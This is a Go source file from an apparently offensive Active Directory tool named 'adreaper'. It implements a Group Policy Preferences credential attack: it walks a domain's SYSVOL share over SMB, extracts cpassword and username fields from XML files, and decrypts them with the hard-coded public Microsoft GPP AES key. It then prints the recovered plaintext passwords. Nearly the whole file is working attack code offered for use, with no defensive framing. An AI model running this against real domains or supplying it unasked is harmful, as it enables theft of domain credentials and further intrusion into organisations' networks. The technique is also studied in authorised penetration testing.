package attacks

import (
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"regexp"
	"strings"

	"adreaper/internal/config"
	"adreaper/internal/output"
	"adreaper/internal/recon"
)

// GPP Key: 31e0627d8132b1adb212430a59a7dae662939104c9ae91cd0facd2d46e2730ca
var gppKey = []byte{
	0x31, 0xe0, 0x62, 0x7d, 0x81, 0x32, 0xb1, 0xad,
	0xb2, 0x12, 0x43, 0x0a, 0x59, 0xa7, 0xda, 0xe6,
	0x62, 0x93, 0x91, 0x04, 0xc9, 0xae, 0x91, 0xcd,
	0x0f, 0xac, 0xd2, 0xd4, 0x6e, 0x27, 0x30, 0xca,
}

// GPPAttack scans SYSVOL for GPP XML files and decrypts passwords.
func GPPAttack(ctx context.Context, opts *config.Options) error {
	output.Info("Scanning SYSVOL for GPP XML files...")

	smbCl, err := recon.NewSMBClient(opts)
	if err != nil {
		return err
	}
	defer smbCl.Close()

	// 1. Recursive search in SYSVOL
	share := "SYSVOL"
	files, err := smbCl.WalkTree(share, ".", 10)
	if err != nil {
		return fmt.Errorf("failed to walk SYSVOL: %w", err)
	}

	if files == nil {
		output.Warn("SYSVOL is empty or inaccessible.")
		return nil
	}

	found := 0
	processEntry(smbCl, share, files, &found)

	if found == 0 {
		output.Success("Scan complete. No GPP credentials found.")
	} else {
		output.Success("Scan complete. Found %d GPP credentials!", found)
	}

	return nil
}

func processEntry(smb *recon.SMBClient, share string, entry *output.TreeEntry, count *found) {
	if !entry.IsDir {
		if strings.HasSuffix(strings.ToLower(entry.Name), ".xml") {
			checkXML(smb, share, entry.Path, count)
		}
		return
	}

	for _, child := range entry.Children {
		processEntry(smb, share, child, count)
	}
}

type found = int

func checkXML(smb *recon.SMBClient, share, path string, count *found) {
	content, err := smb.DownloadFile(share, path)
	if err != nil {
		return
	}

	// Regex to find cpassword="..." and userName="..."
	reCPass := regexp.MustCompile(`cpassword="([^"]+)"`)
	reUser := regexp.MustCompile(`userName="([^"]+)"`)
	reName := regexp.MustCompile(`name="([^"]+)"`)

	matches := reCPass.FindAllStringSubmatch(string(content), -1)
	if len(matches) == 0 {
		return
	}

	for _, m := range matches {
		cpass := m[1]
		userMatch := reUser.FindStringSubmatch(string(content))
		if userMatch == nil {
			userMatch = reName.FindStringSubmatch(string(content))
		}

		username := "Unknown"
		if userMatch != nil {
			username = userMatch[1]
		}

		plain, err := DecryptGPP(cpass)
		if err != nil {
			continue
		}

		output.Critical("[GPP] Found credential in %s", path)
		output.Info("  Username: %s", output.SuccessStr(username))
		output.Info("  Password: %s", output.CriticalStr(plain))
		*count++
	}
}

// DecryptGPP decrypts a GPP cpassword string.
func DecryptGPP(cpassword string) (string, error) {
	// 1. Padding if necessary
	for len(cpassword)%4 != 0 {
		cpassword += "="
	}

	// 2. Base64 decode
	data, err := base64.StdEncoding.DecodeString(cpassword)
	if err != nil {
		return "", err
	}

	// 3. AES Decrypt
	block, err := aes.NewCipher(gppKey)
	if err != nil {
		return "", err
	}

	if len(data) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext too short")
	}

	// IV is 16 bytes of 0s
	iv := make([]byte, aes.BlockSize)
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(data, data)

	// 4. PKCS7 Unpadding (simplistic for XML chars)
	// GPP passwords are little-endian UTF-16
	// We'll just trim null bytes and control chars for the display

	// Convert from UTF-16LE to UTF-8 if needed, but for ASCII passwords string() works enough if we trim.
	// Actually, let's do a better trim of the padding.
	padding := int(data[len(data)-1])
	if padding > 0 && padding <= aes.BlockSize {
		data = data[:len(data)-padding]
	}

	// UTF-16LE to UTF-8
	return cleanUTF16(data), nil
}

func cleanUTF16(b []byte) string {
	var s strings.Builder
	for i := 0; i < len(b); i += 2 {
		if i+1 < len(b) {
			if b[i] != 0 {
				s.WriteByte(b[i])
			}
		}
	}
	return s.String()
}
